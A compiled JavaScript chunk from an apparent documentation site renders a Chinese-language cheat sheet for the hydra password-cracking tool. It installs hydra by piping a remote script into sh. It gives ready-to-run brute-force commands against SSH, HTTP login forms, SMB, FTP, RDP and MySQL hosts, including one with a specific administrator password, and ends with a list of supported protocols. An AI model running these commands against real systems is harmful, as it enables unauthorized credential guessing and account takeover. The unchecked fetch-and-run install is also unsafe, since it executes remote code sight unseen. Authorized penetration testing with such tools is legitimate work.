(window.webpackJsonp=window.webpackJsonp||[]).push([[73],{377:function(t,s,a){"use strict";a.r(s);var v=a(22),_=Object(v.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"hydra"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#hydra"}},[t._v("#")]),t._v(" hydra")]),t._v(" "),a("h2",{attrs:{id:"安装"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安装"}},[t._v("#")]),t._v(" 安装")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("wget -q -O - http://www.atomicorp.com/installers/atomic | sh\nyum install hydra\n")])])]),a("h2",{attrs:{id:"破解ssh"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解ssh"}},[t._v("#")]),t._v(" 破解ssh")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("hydra -L user.txt -P pass.txt -v ssh://192.200.254.254:22345 -t 16\n")])])]),a("h2",{attrs:{id:"http-post破解"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#http-post破解"}},[t._v("#")]),t._v(" http-post破解")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v('hydra -t 3 -L admin.txt -P passwd.txt 192.200.254.224 http-post-form "/login.php:user=^USER^&pass=^PASS^:登录失败" -o http.log\nhttp-post-form httppost方法提交表单\nuser post字段\npass post字段\n^USER^ 固定格式字段\n^PASS^ 固定格式字段\n\n\n登录失败 认证失败返回的html内容包含的信息  \n')])])]),a("h2",{attrs:{id:"破解smb"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解smb"}},[t._v("#")]),t._v(" 破解smb")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("hydra -L admin.txt -P passwd.txt 127.0.0.1 smb\n")])])]),a("h2",{attrs:{id:"破解ftp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解ftp"}},[t._v("#")]),t._v(" 破解ftp")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("hydra -L admin.txt -P passwd.txt 127.0.0.1 ftp -vV\n")])])]),a("h2",{attrs:{id:"破解rdp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解rdp"}},[t._v("#")]),t._v(" 破解rdp")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("hydra -L admin.txt -P passwd.txt 192.200.254.220 rdp -vV -o rdp.txt\n")])])]),a("h2",{attrs:{id:"破解-mysql"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#破解-mysql"}},[t._v("#")]),t._v(" 破解 mysql")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",[a("code",[t._v("hydra -L admin.txt -P passwd.txt mysql://127.0.0.1:3306\nhydra -l  administrator -p sangfor@2015  -t  10   rdp://192.200.254.201\nhydra -L  admin.txt  -P  passwd.txt  -t  10  smb://192.200.254.201\n")])])]),a("h2",{attrs:{id:"其他支持协议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#其他支持协议"}},[t._v("#")]),t._v(" 其他支持协议")]),t._v(" "),a("ul",[a("li",[t._v("asterisk")]),t._v(" "),a("li",[t._v("cisco")]),t._v(" "),a("li",[t._v("cisco-enable")]),t._v(" "),a("li",[t._v("cvs")]),t._v(" "),a("li",[t._v("firebird")]),t._v(" "),a("li",[t._v("ftp")]),t._v(" "),a("li",[t._v("ftps")]),t._v(" "),a("li",[t._v("http[s]-{head|get}")]),t._v(" "),a("li",[t._v("http[s]-{get|post}-form")]),t._v(" "),a("li",[t._v("http-proxy")]),t._v(" "),a("li",[t._v("http-proxy-urlenum")]),t._v(" "),a("li",[t._v("icq")]),t._v(" "),a("li",[t._v("imap[s]")]),t._v(" "),a("li",[t._v("irc")]),t._v(" "),a("li",[t._v("ldap2[s] ldap3[-{cram|digest}md5][s]")]),t._v(" "),a("li",[t._v("mssql")]),t._v(" "),a("li",[t._v("mysql")]),t._v(" "),a("li",[t._v("nntp")]),t._v(" "),a("li",[t._v("oracle-listener oracle-sid")]),t._v(" "),a("li",[t._v("pcanywhere")]),t._v(" "),a("li",[t._v("pcnfs")]),t._v(" "),a("li",[t._v("pop3[s]")]),t._v(" "),a("li",[t._v("postgres")]),t._v(" "),a("li",[t._v("rdp")]),t._v(" "),a("li",[t._v("redis")]),t._v(" "),a("li",[t._v("rexec")]),t._v(" "),a("li",[t._v("rlogin")]),t._v(" "),a("li",[t._v("rsh")]),t._v(" "),a("li",[t._v("s7-300")]),t._v(" "),a("li",[t._v("sip")]),t._v(" "),a("li",[t._v("smb")]),t._v(" "),a("li",[t._v("smtp[s] smtp-enum")]),t._v(" "),a("li",[t._v("snmp")]),t._v(" "),a("li",[t._v("socks5")]),t._v(" "),a("li",[t._v("ssh")]),t._v(" "),a("li",[t._v("sshkey")]),t._v(" "),a("li",[t._v("svn")]),t._v(" "),a("li",[t._v("teamspeak")]),t._v(" "),a("li",[t._v("telnet[s]")]),t._v(" "),a("li",[t._v("vmauthd")]),t._v(" "),a("li",[t._v("vnc")]),t._v(" "),a("li",[t._v("xmpp")])])])}),[],!1,null,null,null);s.default=_.exports}}]);